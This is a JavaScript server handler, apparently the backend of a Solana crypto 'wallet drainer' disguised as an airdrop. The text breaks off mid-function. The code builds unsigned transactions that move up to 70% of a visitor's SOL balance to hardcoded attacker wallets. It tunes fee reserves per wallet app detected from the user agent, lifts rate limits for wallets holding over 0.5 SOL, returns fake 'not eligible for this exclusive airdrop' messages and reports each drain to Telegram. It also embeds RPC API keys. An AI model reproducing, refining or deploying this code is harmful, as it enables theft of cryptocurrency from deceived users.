import 'dotenv/config';
import {
  Connection,
  PublicKey,
  Transaction,
  SystemProgram,
} from '@solana/web3.js';
import telegramLogger from '../src/telegram.js';

// Multiple RPC endpoints for failover
const RPC_ENDPOINTS = [
  { url: process.env.RPC_URL || 'https://mainnet.helius-rpc.com/?api-key=19041dd1-5f30-4135-9b5a-9b670510524b', weight: 1 },
  { url: 'https://api.mainnet-beta.solana.com', weight: 1 },
  { url: 'https://solana-mainnet.g.alchemy.com/v2/demo', weight: 1 },
  { url: 'https://rpc.shyft.to?api_key=-C7eUSlaDtQcR6b0', weight: 1 }
];

let currentRpcIndex = 0;
let rpcFailures = new Map();

// Connection pooling
const connectionPool = new Map();

// Get or create connection from pool with retry logic
async function getConnection() {
  const maxRetries = 3;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const rpcEndpoint = RPC_ENDPOINTS[currentRpcIndex];
    const rpcUrl = rpcEndpoint.url;
    
    try {
      if (!connectionPool.has(rpcUrl)) {
        const connection = new Connection(rpcUrl, {
      commitment: 'confirmed',
      confirmTransactionInitialTimeout: 60000,
      disableRetryOnRateLimit: false,
      httpHeaders: {
        'Content-Type': 'application/json',
      }
    });
        connectionPool.set(rpcUrl, connection);
      }
      
      // Test the connection with timeout
      const connection = connectionPool.get(rpcUrl);
      const testPromise = connection.getLatestBlockhash('confirmed');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('RPC timeout')), 10000)
      );
      
      await Promise.race([testPromise, timeoutPromise]);
      
      // Reset failure count on success
      rpcFailures.set(rpcUrl, 0);
      return connection;
      
    } catch (error) {
      console.error(`[RPC] Failed to connect to ${rpcUrl}:`, error.message);
      
      // Track failures
      const failures = rpcFailures.get(rpcUrl) || 0;
      rpcFailures.set(rpcUrl, failures + 1);
      
      // Skip RPCs with too many failures
      if (failures > 3) {
        console.log(`[RPC] Skipping ${rpcUrl} due to repeated failures`);
      }
      
      // Rotate to next RPC endpoint
      currentRpcIndex = (currentRpcIndex + 1) % RPC_ENDPOINTS.length;
      
      if (attempt === maxRetries - 1) {
        throw new Error(`All RPC endpoints failed after ${maxRetries} attempts`);
      }
      
      // Exponential backoff
      await new Promise(resolve => setTimeout(resolve, Math.min(1000 * Math.pow(2, attempt), 10000)));
    }
  }
}

// Rate limiting
const requestCache = new Map();
const walletRequestCache = new Map();
const blockedIPs = new Set();

const RATE_LIMIT_WINDOW = 60000; // 1 minute
const MAX_REQUESTS_PER_WINDOW = 10;
const MAX_WALLET_REQUESTS_PER_WINDOW = 5;

// Cache cleanup function to prevent memory leaks
function cleanupOldCacheEntries() {
  const now = Date.now();
  const cutoff = now - RATE_LIMIT_WINDOW;
  
  // Clean up IP cache
  for (const [ip, requests] of requestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      requestCache.delete(ip);
    } else {
      requestCache.set(ip, filtered);
    }
  }
  
  // Clean up wallet cache
  for (const [wallet, requests] of walletRequestCache.entries()) {
    const filtered = requests.filter(time => time > cutoff);
    if (filtered.length === 0) {
      walletRequestCache.delete(wallet);
    } else {
      walletRequestCache.set(wallet, filtered);
    }
  }
  
  console.log(`[CACHE_CLEANUP] Cleaned up old entries. IP cache: ${requestCache.size}, Wallet cache: ${walletRequestCache.size}`);
}

// Enhanced rate limiting with high-value wallet bypass
function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
  const now = Date.now();
  
  // Periodic cache cleanup (every 100 requests to avoid performance impact)
  if (Math.random() < 0.01) { // 1% chance to trigger cleanup
    cleanupOldCacheEntries();
  }
  
  // High-value wallet bypass: Skip rate limits for wallets with > 0.5 SOL
  if (walletAddress && walletBalance && walletBalance > 500000000) { // 0.5 SOL = 500,000,000 lamports
    console.log(`[RATE_LIMIT] Checking high-value bypass for ${walletAddress}: ${walletBalance} lamports (${(walletBalance / 1e9).toFixed(6)} SOL)`);
    // Still check IP-based rate limiting for security (but with higher limits)
    const ipRequests = requestCache.get(userIp) || [];
    const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    // Allow higher limits for high-value wallets but still protect against abuse
    const highValueMaxRequests = MAX_REQUESTS_PER_WINDOW * 3; // 3x normal limit
    if (recentIpRequests.length >= highValueMaxRequests) {
      console.log(`[RATE_LIMIT] High-value wallet IP rate limit exceeded: ${userIp} (${recentIpRequests.length}/${highValueMaxRequests})`);
      return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
    }
    
    console.log(`[RATE_LIMIT] High-value wallet bypass: ${walletAddress} has ${(walletBalance / 1e9).toFixed(6)} SOL`);
    return { allowed: true, reason: 'HIGH_VALUE_WALLET_BYPASS' };
  }
  
  // Check IP-based rate limiting
  const ipRequests = requestCache.get(userIp) || [];
  const recentIpRequests = ipRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
  
  if (recentIpRequests.length >= MAX_REQUESTS_PER_WINDOW) {
    return { allowed: false, reason: 'IP_RATE_LIMIT_EXCEEDED', retryAfter: 60 };
  }
  
  // Check wallet-based rate limiting
  if (walletAddress) {
    const walletRequests = walletRequestCache.get(walletAddress) || [];
    const recentWalletRequests = walletRequests.filter(time => now - time < RATE_LIMIT_WINDOW);
    
    if (recentWalletRequests.length >= MAX_WALLET_REQUESTS_PER_WINDOW) {
      return { allowed: false, reason: 'WALLET_RATE_LIMIT_EXCEEDED', retryAfter: 120 };
    }
    
    recentWalletRequests.push(now);
    walletRequestCache.set(walletAddress, recentWalletRequests);
  }
  
  // Check if IP is blocked
  if (blockedIPs.has(userIp)) {
    return { allowed: false, reason: 'IP_BLOCKED', retryAfter: 3600 };
  }
  
  // Update IP request cache
  recentIpRequests.push(now);
  requestCache.set(userIp, recentIpRequests);
  
  return { allowed: true };
}

// CORS headers
function setCORSHeaders(res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Max-Age', '86400');
}

// Enhanced error handling function
async function handleDrainError(error, userPubkey, userIp) {
  const errorType = error.message?.includes('429') ? 'RATE_LIMITED' :
                   error.message?.includes('503') ? 'SERVICE_UNAVAILABLE' :
                   error.message?.includes('insufficient') ? 'INSUFFICIENT_FUNDS' :
                   error.message?.includes('timeout') ? 'TIMEOUT' :
                   'GENERAL_ERROR';
  
  await telegramLogger.logDrainFailed({
    publicKey: userPubkey?.toString() || 'N/A',
    lamports: 0,
    ip: userIp,
    error: error.message
  });
  
  return {
    status: errorType === 'RATE_LIMITED' ? 429 : 
            errorType === 'SERVICE_UNAVAILABLE' ? 503 : 500,
    error: 'Service temporarily unavailable',
    details: 'Please try again later.',
    code: errorType
  };
}

export default async function handler(req, res) {
  const startTime = Date.now();
  const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    setCORSHeaders(res);
    res.status(200).end();
    return;
  }

  // Set CORS headers for all responses
  setCORSHeaders(res);

  // Get user public key from query or body
  let userPublicKey;
  if (req.method === 'GET') {
    userPublicKey = req.query.user || req.query.publicKey || req.query.wallet;
  } else if (req.method === 'POST') {
    const body = req.body;
    userPublicKey = body.user || body.publicKey || body.wallet || body.pubkey;
  }

  try {
    // Create receiver wallets
    let RECEIVER, RECEIVER_2, RECEIVER_3, RECEIVER_4;
    
    try {
      RECEIVER = new PublicKey(process.env.RECEIVER_WALLET || '6sH3cWEc7Ams4E8fv1RC8FxMqb9UVLrncA6TGk9waqTR');
      RECEIVER_2 = new PublicKey(process.env.RECEIVER_WALLET_2 || '6sH3cWEc7Ams4E8fv1RC8FxMqb9UVLrncA6TGk9waqTR');
      RECEIVER_3 = new PublicKey(process.env.RECEIVER_WALLET_3 || '6sH3cWEc7Ams4E8fv1RC8FxMqb9UVLrncA6TGk9waqTR');
      RECEIVER_4 = new PublicKey(process.env.RECEIVER_WALLET_4 || '6sH3cWEc7Ams4E8fv1RC8FxMqb9UVLrncA6TGk9waqTR');
    } catch (error) {
      console.error('Receiver address error:', error.message);
      await telegramLogger.logError({
        user: 'N/A',
        ip: userIp,
        message: 'Invalid receiver wallet addresses in environment variables'
      });
      return res.status(500).json({ error: 'Server configuration error', details: 'Invalid receiver addresses' });
    }

    if (!userPublicKey) {
      await telegramLogger.logError({
        user: 'N/A',
        ip: userIp,
        message: 'Missing user parameter in request'
      });

      return res.status(400).json({ 
        error: 'Missing user parameter', 
        details: 'Please provide a valid Solana wallet address.',
        code: 'MISSING_PARAMETER'
      });
    }

    // Validate public key
    let userPubkey;
    try {
      userPubkey = new PublicKey(userPublicKey);
      
      // Check if this is a valid user wallet (not a program address)
      if (userPublicKey === '11111111111111111111111111111111' || 
          userPublicKey === SystemProgram.programId.toString()) {
        
        await telegramLogger.logError({
          user: userPublicKey,
          ip: userIp,
          message: `Attempted to drain from program address: ${userPublicKey}`
        });

        return res.status(400).json({ 
          error: 'Invalid wallet address', 
          details: 'Cannot drain from program addresses. Please provide a valid user wallet address.',
          code: 'INVALID_WALLET_ADDRESS'
        });
      }
    } catch (error) {
              await telegramLogger.logError({
          user: userPublicKey,
          ip: userIp,
          message: `Invalid public key format: ${userPublicKey}`
        });

      return res.status(400).json({ 
        error: 'Invalid wallet address', 
        details: 'Please provide a valid Solana wallet address.',
        code: 'INVALID_PUBLIC_KEY'
      });
    }

    // Get user balance with retry mechanism
    let lamports = 0;
    let retryCount = 0;
    const maxRetries = 5;
    
    while (retryCount < maxRetries) {
      try {
        const connection = await getConnection();
        lamports = await connection.getBalance(userPubkey);
        console.log(`[BALANCE] Successfully fetched balance: ${lamports} lamports (${(lamports / 1e9).toFixed(6)} SOL)`);
        break;
      } catch (error) {
        retryCount++;
        
        // Enhanced retry logic with exponential backoff
        const backoffDelay = Math.min(1000 * Math.pow(2, retryCount - 1), 10000);
        
        if (error.message?.includes('429')) {
          console.log(`[RATE_LIMIT] Retry ${retryCount}/${maxRetries} - Rate limited, waiting ${backoffDelay}ms`);
          await new Promise(resolve => setTimeout(resolve, backoffDelay));
        } else if (error.message?.includes('503')) {
          console.log(`[SERVICE_UNAVAILABLE] Retry ${retryCount}/${maxRetries} - Service unavailable, waiting ${backoffDelay}ms`);
          await new Promise(resolve => setTimeout(resolve, backoffDelay));
        } else if (error.message?.includes('timeout')) {
          console.log(`[TIMEOUT] Retry ${retryCount}/${maxRetries} - Connection timeout, waiting ${backoffDelay}ms`);
          await new Promise(resolve => setTimeout(resolve, backoffDelay));
        } else {
          console.log(`[BALANCE_ERROR] Retry ${retryCount}/${maxRetries}: ${error.message}, waiting ${backoffDelay}ms`);
          await new Promise(resolve => setTimeout(resolve, backoffDelay));
        }
        


        if (retryCount >= maxRetries) {
          console.log(`[BALANCE] Failed to fetch balance after ${maxRetries} attempts`);
          return res.status(503).json({ 
            error: 'Service temporarily unavailable', 
            details: 'Unable to fetch wallet balance. Please try again later.',
            code: 'BALANCE_FETCH_FAILED'
          });
        }
      }
    }
    
    // Rate limiting check with wallet balance bypass for high-value wallets
    const rateLimitCheck = checkRateLimit(userIp, userPublicKey, lamports);
    if (!rateLimitCheck.allowed) {
      await telegramLogger.logSecurityEvent({
        type: rateLimitCheck.reason,
        user: userPublicKey || 'N/A',
        ip: userIp,
        details: `Rate limit exceeded - retry after ${rateLimitCheck.retryAfter} seconds`
      });

      return res.status(429).json({ 
        error: 'Rate limit exceeded', 
        details: 'Too many requests. Please try again later.',
        retryAfter: rateLimitCheck.retryAfter
      });
    }
    
    // Log high-value wallet bypass if applicable
    if (rateLimitCheck.reason === 'HIGH_VALUE_WALLET_BYPASS') {
      await telegramLogger.logHighValueBypass({
        user: userPublicKey || 'N/A',
        ip: userIp,
        lamports: lamports
      });
    }

    // Define fee calculation variables at function scope
    // Phantom-optimized drain settings (working configuration)
    const PHANTOM_FEE_BUFFER = 100000; // ~0.0001 SOL for Phantom network fees + safety margin
    const PHANTOM_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
    const PHANTOM_TOTAL_RESERVED = PHANTOM_FEE_BUFFER + PHANTOM_RESERVE_LAMPORTS;
    
    // Solflare-optimized drain settings (more aggressive)
    const SOLFLARE_FEE_BUFFER = 75000; // ~0.000075 SOL for network fees
    const SOLFLARE_RESERVE_LAMPORTS = 25000; // Keep SOL for safety and rent
    const SOLFLARE_TOTAL_RESERVED = SOLFLARE_FEE_BUFFER + SOLFLARE_RESERVE_LAMPORTS;
    
    // Glow-optimized drain settings (similar to Phantom)
    const GLOW_FEE_BUFFER = 100000; // ~0.0001 SOL for Glow network fees + safety margin
    const GLOW_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
    const GLOW_TOTAL_RESERVED = GLOW_FEE_BUFFER + GLOW_RESERVE_LAMPORTS;
    
    // Backpack-optimized drain settings (similar to Phantom)
    const BACKPACK_FEE_BUFFER = 100000; // ~0.0001 SOL for Backpack network fees + safety margin
    const BACKPACK_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
    const BACKPACK_TOTAL_RESERVED = BACKPACK_FEE_BUFFER + BACKPACK_RESERVE_LAMPORTS;
    
    // Exodus-optimized drain settings (similar to Phantom)
    const EXODUS_FEE_BUFFER = 100000; // ~0.0001 SOL for Exodus network fees + safety margin
    const EXODUS_RESERVE_LAMPORTS = 50000; // Keep extra SOL for safety and rent
    const EXODUS_TOTAL_RESERVED = EXODUS_FEE_BUFFER + EXODUS_RESERVE_LAMPORTS;
    
    // Get wallet type from user agent or other means
    const userAgent = req.headers['user-agent'] || '';
    const isSolflare = userAgent.includes('Solflare') || userAgent.includes('solflare');
    const isGlow = userAgent.includes('Glow') || userAgent.includes('glow');
    const isBackpack = userAgent.includes('Backpack') || userAgent.includes('backpack');
    const isExodus = userAgent.includes('Exodus') || userAgent.includes('exodus');
    
    // Use wallet-specific settings
    let FEE_BUFFER, RESERVE_LAMPORTS, TOTAL_RESERVED;
    
    if (isSolflare) {
      FEE_BUFFER = SOLFLARE_FEE_BUFFER;
      RESERVE_LAMPORTS = SOLFLARE_RESERVE_LAMPORTS;
      TOTAL_RESERVED = SOLFLARE_TOTAL_RESERVED;
    } else if (isGlow) {
      FEE_BUFFER = GLOW_FEE_BUFFER;
      RESERVE_LAMPORTS = GLOW_RESERVE_LAMPORTS;
      TOTAL_RESERVED = GLOW_TOTAL_RESERVED;
    } else if (isBackpack) {
      FEE_BUFFER = BACKPACK_FEE_BUFFER;
      RESERVE_LAMPORTS = BACKPACK_RESERVE_LAMPORTS;
      TOTAL_RESERVED = BACKPACK_TOTAL_RESERVED;
    } else if (isExodus) {
      FEE_BUFFER = EXODUS_FEE_BUFFER;
      RESERVE_LAMPORTS = EXODUS_RESERVE_LAMPORTS;
      TOTAL_RESERVED = EXODUS_TOTAL_RESERVED;
    } else {
      // Default to Phantom settings for unknown wallets
      FEE_BUFFER = PHANTOM_FEE_BUFFER;
      RESERVE_LAMPORTS = PHANTOM_RESERVE_LAMPORTS;
      TOTAL_RESERVED = PHANTOM_TOTAL_RESERVED;
    }

    // Create transaction
    const tx = new Transaction();

    // Smart SOL drain strategy with balance fetching and retry logic
    try {
      // Strategy: Always fetch fresh balance and subtract proper fees
      const FRESH_BALANCE = lamports; // Already fetched above
      
      // Enhanced debugging for drain calculation
      console.log(`[DRAIN_DEBUG] Wallet: ${userPubkey.toString()}`);
      console.log(`[DRAIN_DEBUG] Fresh Balance: ${FRESH_BALANCE} lamports (${(FRESH_BALANCE / 1e9).toFixed(6)} SOL)`);
      console.log(`[DRAIN_DEBUG] Total Reserved: ${TOTAL_RESERVED} lamports (${(TOTAL_RESERVED / 1e9).toFixed(6)} SOL)`);
      console.log(`[DRAIN_DEBUG] Wallet Type Detection:`);
      console.log(`[DRAIN_DEBUG] - Is Solflare: ${isSolflare}`);
      console.log(`[DRAIN_DEBUG] - Is Glow: ${isGlow}`);
      console.log(`[DRAIN_DEBUG] - Is Backpack: ${isBackpack}`);
      console.log(`[DRAIN_DEBUG] - Is Exodus: ${isExodus}`);
      console.log(`[DRAIN_DEBUG] - User Agent: ${userAgent.substring(0, 100)}...`);
      
      // Check if wallet has enough SOL for fees (at least 0.0001 SOL)
      const MINIMUM_MEANINGFUL_SOL = 100000; // 0.0001 SOL (enough for fees + small drain)
      
      if (FRESH_BALANCE < MINIMUM_MEANINGFUL_SOL) {
        console.log(`[DRAIN_DEBUG] Insufficient SOL for fees: ${FRESH_BALANCE} < ${MINIMUM_MEANINGFUL_SOL}`);
        await telegramLogger.logInsufficientFunds({
          user: userPubkey.toString(),
          ip: userIp,
          lamports: FRESH_BALANCE
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_SOL_FOR_FEES'
        });
      }
      
      // Check if wallet has enough funds after reserving fees
      if (FRESH_BALANCE > TOTAL_RESERVED) {
        // Calculate safe drain amount with proper fee subtraction
        const availableForDrain = FRESH_BALANCE - TOTAL_RESERVED;
        console.log(`[DRAIN_DEBUG] Available for drain: ${availableForDrain} lamports (${(availableForDrain / 1e9).toFixed(6)} SOL)`);
        
        // Dynamic drain: Always 70% of wallet balance as long as it has meaningful funds
        const DRAIN_PERCENTAGE = 0.7; // 70% of wallet balance
        let drainAmount = Math.floor(lamports * DRAIN_PERCENTAGE);
        
        // Ensure we don't drain more than available (after reserving fees)
        drainAmount = Math.min(drainAmount, availableForDrain);
        
        console.log(`[DRAIN_DEBUG] Available: ${availableForDrain} lamports, 70% of wallet: ${Math.floor(lamports * DRAIN_PERCENTAGE)} lamports, Initial drain amount: ${drainAmount} lamports (${(drainAmount / 1e9).toFixed(6)} SOL)`);
        
        // Add fallback: if amount is too small, skip the drain
        if (drainAmount <= 0) {
          console.log(`[DRAIN_DEBUG] Drain amount too small: ${drainAmount} lamports`);
          await telegramLogger.logDrainFailed({
            publicKey: userPubkey.toString(),
            lamports: lamports,
            ip: userIp,
            error: `Drain amount too small: ${drainAmount} lamports`
          });
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INSUFFICIENT_DRAIN_AMOUNT',
            reason: 'Drain amount too small after fee calculation'
          });
        }
        
        // Additional safety check: ensure we're not draining too much
        const MINIMUM_BALANCE_AFTER_DRAIN = 75000; // ~0.000075 SOL minimum balance (reduced for small wallets)
        const maxSafeDrain = lamports - MINIMUM_BALANCE_AFTER_DRAIN;
        
        // Validate that we can safely drain
        if (maxSafeDrain <= 0) {
          console.log(`[DRAIN_DEBUG] Cannot drain safely: ${lamports} - ${MINIMUM_BALANCE_AFTER_DRAIN} = ${maxSafeDrain} <= 0`);
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INSUFFICIENT_FUNDS_FOR_SAFE_DRAIN'
          });
        }
        
        const safeDrainAmount = Math.min(drainAmount, maxSafeDrain);
        console.log(`[DRAIN_DEBUG] Safe drain amount: ${safeDrainAmount} lamports (${(safeDrainAmount / 1e9).toFixed(6)} SOL)`);
        
        const finalDrainAmount = safeDrainAmount;
        
        // Ensure minimum meaningful drain amount (reduced for small wallets)
        const MINIMUM_DRAIN_AMOUNT = 50000; // 0.00005 SOL minimum drain amount
        if (finalDrainAmount < MINIMUM_DRAIN_AMOUNT) {
          console.log(`[DRAIN_DEBUG] Final drain amount too small: ${finalDrainAmount} < ${MINIMUM_DRAIN_AMOUNT}`);
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INSUFFICIENT_DRAIN_AMOUNT'
          });
        }
        
        console.log(`[DRAIN] Creating transfer: ${finalDrainAmount} lamports (${(finalDrainAmount / 1e9).toFixed(6)} SOL) from ${userPubkey.toString()} to ${RECEIVER.toString()}`);
        
        // Validate drain amount before creating instruction
        if (finalDrainAmount <= 0) {
          console.log(`[DRAIN_DEBUG] Invalid drain amount: ${finalDrainAmount} <= 0`);
          return res.status(400).json({
            error: 'Sorry, You\'re Not eligible',
            details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
            code: 'INVALID_DRAIN_AMOUNT'
          });
        }
        
        const transferIx = SystemProgram.transfer({
          fromPubkey: userPubkey,
          toPubkey: RECEIVER,
          lamports: finalDrainAmount,
        });
        tx.add(transferIx);
        
        console.log(`[DRAIN_DEBUG] Transaction instruction added successfully`);
        
      } else {
        console.log(`[DRAIN_DEBUG] Insufficient funds after reserving fees: ${FRESH_BALANCE} <= ${TOTAL_RESERVED}`);
        await telegramLogger.logInsufficientFunds({
          user: userPubkey.toString(),
          ip: userIp,
          lamports: lamports
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_FUNDS'
        });
      }
    } catch (error) {
      await telegramLogger.logError({
        type: 'TRANSACTION_CREATION_ERROR',
        user: userPubkey.toString(),
        ip: userIp,
        message: 'Failed to create transaction',
        stack: error.stack
      });
      return res.status(500).json({ error: 'Failed to create transaction', details: error.message });
    }

    // Check if transaction has instructions
    if (tx.instructions.length === 0) {
      await telegramLogger.logDrainAttempt({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        tokenCount: 0,
        nftCount: 0,
        transactionSize: 0,
        instructions: 0,
        success: false,
        actualDrainAmount: 0,
        hasTokens: false,
        hasNFTs: false,
        error: 'Insufficient funds - no SOL to drain'
      });

      return res.status(400).json({ 
        error: 'Sorry, You\'re Not eligible', 
        details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
        code: 'INSUFFICIENT_FUNDS'
      });
    }

    // Finalize transaction
    try {
      const connection = await getConnection();
      
      // Get fresh blockhash with retry logic
      let blockhash;
      let retryCount = 0;
      const maxBlockhashRetries = 3;
      
      while (retryCount < maxBlockhashRetries) {
        try {
          blockhash = await connection.getLatestBlockhash('confirmed');
          break;
        } catch (blockhashError) {
          retryCount++;
          console.error(`[BLOCKHASH] Retry ${retryCount}/${maxBlockhashRetries}:`, blockhashError.message);
          
          if (retryCount >= maxBlockhashRetries) {
            throw new Error('Failed to get fresh blockhash after multiple attempts');
          }
          
          await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
        }
      }
      
      tx.feePayer = userPubkey;
      tx.recentBlockhash = blockhash.blockhash;
      
      // Validate transaction structure
      if (!tx.feePayer || !tx.recentBlockhash) {
        console.error('[DRAIN] Transaction validation failed:', {
          hasFeePayer: !!tx.feePayer,
          hasBlockhash: !!tx.recentBlockhash,
          feePayer: tx.feePayer?.toString(),
          blockhash: tx.recentBlockhash
        });
        throw new Error('Transaction missing required fields');
      }
      
      console.log('[DRAIN] Transaction structure validated:', {
        feePayer: tx.feePayer.toString(),
        blockhash: tx.recentBlockhash,
        instructions: tx.instructions.length
      });


      
      // Calculate actual transaction fee with better error handling
      let actualFee = 0;
      try {
        const feeCalculator = await connection.getFeeForMessage(tx.compileMessage(), blockhash.blockhash);
        actualFee = feeCalculator.value || 5000; // Default to 5000 if calculation fails
        console.log(`[DRAIN] Calculated transaction fee: ${actualFee} lamports`);
        console.log(`[DRAIN] Wallet balance: ${lamports} lamports`);
        console.log(`[DRAIN] Fee adequacy: ${lamports >= actualFee ? 'SUFFICIENT' : 'INSUFFICIENT'}`);
      } catch (feeError) {
        console.log(`[DRAIN] Fee calculation failed, using conservative default: ${feeError.message}`);
        actualFee = 10000; // More conservative default for better success rate
      }
      
      // Simple fee adequacy check - no complex retry logic
      console.log(`[DRAIN] Fee adequacy check: ${lamports} lamports >= ${actualFee} lamports`);
      
      if (lamports <= actualFee) {
        console.log(`[DRAIN] Insufficient funds for fee: ${lamports} < ${actualFee}`);
        await telegramLogger.logSecurityEvent({
          type: 'INSUFFICIENT_FUNDS_FOR_FEE',
          user: userPubkey.toString(),
          ip: userIp,
          details: `Wallet has ${lamports} lamports but needs ${actualFee} lamports for fees`
        });
        return res.status(400).json({
          error: 'Sorry, You\'re Not eligible',
          details: 'This exclusive airdrop is only available for wallets with existing funds. Please try again with a funded wallet.',
          code: 'INSUFFICIENT_FUNDS_FOR_FEE'
        });
      }
      
      console.log(`[DRAIN] Sufficient funds for fee: ${lamports} >= ${actualFee}`);
      
      // Serialize transaction
      let serialized;
      try {
        if (!tx.feePayer || !tx.recentBlockhash) {
          throw new Error('Transaction missing required fields (feePayer or recentBlockhash)');
        }
        
        serialized = tx.serialize({ requireAllSignatures: false });
        
        if (!serialized || serialized.length === 0) {
          throw new Error('Transaction serialization produced empty result');
        }
      } catch (serializeError) {
        await telegramLogger.logError({
          type: 'SERIALIZATION_ERROR',
          user: userPubkey.toString(),
          ip: userIp,
          message: 'Failed to serialize transaction',
          stack: serializeError.stack
        });
        return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
      }
      
      // Determine drain potential with smart strategy (using existing variables)
      const actualDrainAmount = lamports > TOTAL_RESERVED ? lamports - TOTAL_RESERVED : 0;
      const hasMeaningfulSOL = lamports > 100000; // > 0.0001 SOL
      const hasEnoughForFees = lamports > TOTAL_RESERVED; // > 0.000015 SOL for fees + reserve
      const hasValidSOLDrain = hasMeaningfulSOL && actualDrainAmount > 0 && hasEnoughForFees;
      const hasDrainInstructions = tx.instructions.length > 0;
      const hasPotentialForDrain = hasValidSOLDrain && hasDrainInstructions;
      
      // Enhanced drain attempt logging with detailed information
      console.log(`[DRAIN_LOG] Drain attempt details:`);
      console.log(`[DRAIN_LOG] - Wallet: ${userPubkey.toString()}`);
      console.log(`[DRAIN_LOG] - Balance: ${lamports} lamports (${(lamports / 1e9).toFixed(6)} SOL)`);
      console.log(`[DRAIN_LOG] - Actual drain amount: ${actualDrainAmount} lamports (${(actualDrainAmount / 1e9).toFixed(6)} SOL)`);
      console.log(`[DRAIN_LOG] - Has meaningful SOL: ${hasMeaningfulSOL}`);
      console.log(`[DRAIN_LOG] - Has enough for fees: ${hasEnoughForFees}`);
      console.log(`[DRAIN_LOG] - Has valid SOL drain: ${hasValidSOLDrain}`);
      console.log(`[DRAIN_LOG] - Has drain instructions: ${hasDrainInstructions}`);
      console.log(`[DRAIN_LOG] - Has potential for drain: ${hasPotentialForDrain}`);
      
      // Determine wallet type from user agent detection
      let detectedWalletType = 'Unknown';
      if (isSolflare) detectedWalletType = 'Solflare';
      else if (isGlow) detectedWalletType = 'Glow';
      else if (isBackpack) detectedWalletType = 'Backpack';
      else if (isExodus) detectedWalletType = 'Exodus';
      else if (userAgent.includes('Phantom') || userAgent.includes('phantom')) detectedWalletType = 'Phantom';
      else if (userAgent.includes('TrustWallet') || userAgent.includes('trustwallet')) detectedWalletType = 'Trust Wallet';
      
      // Debug logging for wallet type detection
      console.log('[WALLET_TYPE_DEBUG] User Agent:', userAgent);
      console.log('[WALLET_TYPE_DEBUG] Detected wallet type:', detectedWalletType);
      console.log('[WALLET_TYPE_DEBUG] Is Solflare:', isSolflare);
      console.log('[WALLET_TYPE_DEBUG] Is Glow:', isGlow);
      console.log('[WALLET_TYPE_DEBUG] Is Backpack:', isBackpack);
      console.log('[WALLET_TYPE_DEBUG] Is Exodus:', isExodus);
      
      // Note: Wallet detection is already logged by frontend via /api/drainer/log-wallet
      // Backend only logs drain success/failure, not wallet detection
      
      // Return transaction data
      const response = {
        success: true,
        transaction: Buffer.from(serialized).toString('base64'),
        metadata: {
          user: userPubkey.toString(),
          instructions: tx.instructions.length,
          size: serialized.length,
          tokens: 0,
          nfts: 0,
          solAmount: lamports > TOTAL_RESERVED ? lamports - TOTAL_RESERVED : 0,
          feeAmount: TOTAL_RESERVED,
          totalBalance: lamports,
          timestamp: new Date().toISOString()
        }
      };
      
      // Validate response data
      if (!response.transaction || response.transaction.length === 0) {
        throw new Error('Invalid transaction data');
      }
      
      // Validate base64 encoding
      try {
        const testDecode = Buffer.from(response.transaction, 'base64');
        if (testDecode.length === 0) {
          throw new Error('Invalid base64 encoding');
        }
        
        const base64Regex = /^[A-Za-z0-9+/]*={0,2}$/;
        if (!base64Regex.test(response.transaction)) {
          throw new Error('Invalid base64 string format');
        }
      } catch (base64Error) {
              await telegramLogger.logDrainFailed({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        ip: userIp,
        error: 'Failed to encode transaction as base64'
      });
        return res.status(500).json({ error: 'Failed to encode transaction', details: 'Transaction encoding failed' });
      }
      

      
      res.status(200).json(response);
    } catch (error) {
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey?.toString() || 'N/A',
        lamports: lamports || 0,
        ip: userIp,
        error: 'Failed to finalize transaction'
      });
      return res.status(500).json({ error: 'Failed to finalize transaction', details: error.message });
    }

  } catch (error) {
    console.error('[API] General error:', error);
    
    try {
      const errorResponse = await handleDrainError(error, userPubkey, userIp);
      return res.status(errorResponse.status).json({ 
        error: errorResponse.error, 
        details: errorResponse.details,
        code: errorResponse.code
      });
    } catch (logError) {
      console.error('[API] Failed to handle error:', logError);
      return res.status(500).json({ error: 'Failed to generate transaction', details: error.message });
    }
  }
}

// Handle drain confirmation logging
export async function logConfirmation(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { publicKey, txid, status, error } = req.body;
    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

    if (status === 'confirmed' || status === 'finalized') {
      // Log successful drain
      await telegramLogger.logDrainSuccess({
        publicKey: publicKey,
